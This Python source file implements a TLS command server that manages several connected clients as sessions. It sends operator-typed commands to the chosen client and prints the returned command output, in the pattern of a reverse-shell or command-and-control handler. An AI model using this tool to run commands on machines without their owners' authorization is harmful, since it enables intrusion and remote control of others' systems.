import socket
import logging
import threading

import ssl
import base64
import hmac
import hashlib

# Global Constants
SERVER_HOST = "127.0.0.1"
PORT = 2222
MAX_BYTES_REPONSE = 65536
ENCODING = "utf-8"

PROMPT = "> "
FIRST_SESSION_ID = 1

COMMAND_INDEX = 0
CLIENT_ID_INDEX = 1

STOP_ARGUMENTS = 1
SESSIONS_ARGUMENTS = 1
USE_ARGUMENTS = 2

CONNECTIONS_TIMEOUT = 1.0
MAIN_SESSION_TIMEOUT = 0.5

LOG_FILE_NAME = "server.log"
LOG_FORMAT = "%(asctime)s - %(address)s [%(session_id)s] - %(message)s"
LOG_DEFAULT_LEVEL = logging.INFO

CERTFILE = "certs/cert.pem"
KEYFILE = "certs/key.pem"
HMAC_KEY = "hmac.key"

sessions = {}
main_session_ready = threading.Event()
server_running = threading.Event()
server_running.set()

class Session():
    # Represents a single active client session with the server.

    id_counter = FIRST_SESSION_ID


    def __init__(self, connection):
        # Initialize a session for a connected client.

        self.id = Session.id_counter
        Session.id_counter += 1
        self.connection = connection
        self.connection.settimeout(CONNECTIONS_TIMEOUT)
        self.client_host = connection.recv(MAX_BYTES_REPONSE).decode(ENCODING)

    
    def send_new_message(self, logger, hmac_key):
        # Send a message to the client.

        message = input(PROMPT)

        try:
            if message:
                # signature = hmac.new(hmac_key, message.encode(ENCODING), hashlib.sha256).hexdigest()
                self.connection.send(bytes(message, encoding=ENCODING))
                # self.connection.send(bytes(signature, encoding=ENCODING))
                self.connection.send(b'') # Check if the client is alive.
                print_log(logger, f"Sent: {message}", self, False)
            return 
        
        except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError, OSError):
            self.stop_connection(logger)
            return None


    def get_output(self, logger):
        # Get the response from the client (stdout and stderr), and print it.
        try:
            response = self.connection.recv(MAX_BYTES_REPONSE).decode(ENCODING)
            print_log(logger, f"Recived: {response}", self)

            return response
        except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError, OSError):
            self.stop_connection(logger)
            return None
        


    def stop_connection(self, logger):
        # Close the connection of a session.

        self.connection.close()
        print_log(logger, f"Client disconnected: {self.client_host} (Session ID: {self.id})", self)
        sessions.pop(self.id)
        if len(sessions) == 0:
            server_running.clear()


def create_tcp_socket(logger):
    # Create a new TCP Socket object.

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.settimeout(CONNECTIONS_TIMEOUT)
    print_log(logger, "Server Started")
    return server_socket


def bind_and_listen(logger, socket_object, server_host, port):
    # Binding the server's host, and listen to client.

    socket_object.bind((server_host, port))

    print_log(logger, "Waiting for connections...")
    socket_object.listen()


def get_hmac(file_name):
    with open(file_name, "r") as f:
        key_b64 = f.read().strip()
        hmac_key = base64.b64decode(key_b64)
        return hmac_key


def make_socket_tls(server_socket):
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)

    tls_socket = context.wrap_socket(server_socket, server_side=True)
    return tls_socket


def wait_for_new_connections(logger, socket_object):
    # Wait for new connections, and add them to the session dictionary.

    global sessions, main_session_ready

    while server_running.is_set():
        try:
            connection, _ = socket_object.accept() # Wait for connections.

            # Create a new session from the new connection.
            new_session = Session(connection)
            sessions[new_session.id] = new_session

            # If its the first session, tell the main function that the session ready.
            if len(sessions) == 1:
                main_session_ready.set()
                print_log(logger, f"Client connected: {new_session.client_host} (Session ID: {new_session.id})", new_session)
            else:
                print(f"\nClient connected: {new_session.client_host} (Session ID: {new_session.id})\n> ", end="")
                print_log(logger, f"Client connected: {new_session.client_host} (Session ID: {new_session.id})", new_session, printable=False)
        except socket.timeout:
            continue
        except KeyboardInterrupt:
            break
        except OSError:
            break


def handle_messages_session(logger, current_session, hmac_key):
    # A for loop that take input, and handle sending and recieving the messages

    global sessions

    while server_running.is_set():

        message = current_session.send_new_message(logger, hmac_key)

        # Check if there is valid connection, and the message is ok.
        if len(sessions) == 0: break
        if current_session.id not in sessions.keys():
            current_session = next(iter(sessions.values()))
            print_log(logger, f"Now connected to: {current_session.client_host} (Session ID: {current_session.id})", current_session)
        if not message: continue

        # Check if it can be splited to different words.
        message_arguments = message.split()
        if not message_arguments: continue

        # Take the first word and set it as the command.
        command = message_arguments[COMMAND_INDEX]

        match command:

            
            case "stop":
                # If the message is stop, stop the session.

                if len(message_arguments) != STOP_ARGUMENTS:
                    print_log(logger, f"Too many arguments, Usage: stop", current_session)
                    continue
                current_session.stop_connection(logger)
                if len(sessions) == 0: break

                # If There are still other sessions left, switch to the next session.
                current_session = next(iter(sessions.values()))
                print_log(logger, f"Now connected to: {current_session.client_host} (Session ID: {current_session.id})", current_session)

            case "sessions":
                # If the message is sessions, Show the sessions.

                if len(message_arguments) != SESSIONS_ARGUMENTS:
                    print_log(logger, f"Too many arguments, Usage: sessions", current_session)
                    continue
                elif not sessions:
                    continue

                list_of_sessions = "\n"

                # Go over all of the sessions and add them to the string.
                for session in sessions.values():
                    if session.id == current_session.id:
                        list_of_sessions += "* " # Highlight the current session
                    list_of_sessions += f"ID {session.id} - Host: {session.client_host}\n"
                print_log(logger, list_of_sessions, current_session)

            case "use":
                # If the message is use <client's id>, switch to the desired id.

                if len(message_arguments) > USE_ARGUMENTS:
                    print_log(logger, f"Too many arguments, Usage: use <client's id>", current_session)
                    continue
                elif len(message_arguments) < USE_ARGUMENTS:
                    print_log(logger, f"Too few arguments, Usage: use <client's id>", current_session)
                    continue
                elif not message_arguments[CLIENT_ID_INDEX].isdigit():
                    print_log(logger, f"Argument is not a number, Usage: use <client's id>", current_session)
                    continue
                elif int(message_arguments[CLIENT_ID_INDEX]) not in sessions.keys():
                    print_log(logger, f"Invalid client's id, Usage: use <client's id>", current_session)
                    continue

                # Setting the current session to the desired session.
                current_session = sessions[int(message_arguments[CLIENT_ID_INDEX])]
                print_log(logger, f"Session {current_session.id} set", current_session)  

            case _ :
                # Getting back the output that sent to the server.

                current_session.get_output(logger)


def create_logger():
    # Create a new logger

    logger = logging.getLogger(__name__)
    logging.basicConfig(filename=LOG_FILE_NAME, format=LOG_FORMAT, level=LOG_DEFAULT_LEVEL)
    return logger


def print_log(logger, log, session=None, printable=True):
    # Print the log to a file, if printable is true, then also printing the log to terminal.

    if printable: print(log) 
    if session:
        logger.info(log, extra={"address": session.client_host, "session_id": session.id})
    else:
        logger.info(log, extra={"address": SERVER_HOST, "session_id": "server"})


def main():

    # Create logger
    logger = create_logger()
    hmac_key = get_hmac(HMAC_KEY)
    

    with create_tcp_socket(logger) as server_socket:

        bind_and_listen(logger, server_socket, SERVER_HOST, PORT)

        server_socket = make_socket_tls(server_socket)

        # Creating a thread for accepting new connections.
        wait_for_connections_thread = threading.Thread(target=wait_for_new_connections, args=(logger, server_socket))

        # wait for at least one session
        wait_for_connections_thread.start()
        
        try:
            # wait until the first connection is set.
            while not main_session_ready.is_set():
                main_session_ready.wait(timeout=MAIN_SESSION_TIMEOUT)
            
            # Enter the main loop.
            handle_messages_session(logger, sessions[FIRST_SESSION_ID], hmac_key)
        except KeyboardInterrupt:
            pass # Exit when interrupted by keyboard.
        finally:
            # Closing all connections.
            server_running.clear()
            for session in list(sessions.values()):
                session.stop_connection(logger)


if __name__ == "__main__":
    main()